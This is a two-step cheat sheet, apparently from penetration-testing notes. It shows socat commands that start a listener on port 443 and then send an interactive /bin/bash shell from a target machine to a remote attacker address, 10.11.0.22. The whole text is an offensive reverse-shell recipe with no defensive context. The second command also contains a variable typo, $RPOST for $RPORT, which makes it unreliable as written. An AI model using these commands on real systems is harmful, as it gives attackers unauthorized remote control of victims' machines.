# 1) spawn listener for remote shell
```sh
LPORT=443
socat -d -d TCP4-LISTEN:$LPORT STDOUT
```

# 2) send bash to remote attacker
```sh
RHOST=10.11.0.22
RPORT=443
socat TCP4:$RHOST:$RPOST EXEC:/bin/bash
```
